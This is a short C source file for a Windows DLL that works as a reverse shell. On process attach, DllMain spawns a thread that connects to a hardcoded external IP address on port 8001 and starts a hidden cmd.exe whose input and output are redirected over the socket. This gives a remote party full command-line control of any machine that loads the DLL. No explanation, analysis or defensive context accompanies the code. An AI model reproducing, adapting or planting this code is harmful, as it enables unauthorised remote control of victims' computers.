#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <string.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

DWORD WINAPI ReverseShell(LPVOID lpParam) {
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};

    WSAStartup(MAKEWORD(2,2), &wsa);
    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    server.sin_family = AF_INET;
    server.sin_port = htons(8001);
    server.sin_addr.s_addr = inet_addr("157.245.3.180");

    if (WSAConnect(sock, (SOCKADDR*)&server, sizeof(server), NULL, NULL, NULL, NULL) == 0) {
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES;
        si.wShowWindow = SW_HIDE;
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
        CreateProcessA(NULL, (LPSTR)"cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    }
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        CreateThread(NULL, 0, ReverseShell, NULL, 0, NULL);
    }
    return TRUE;
}
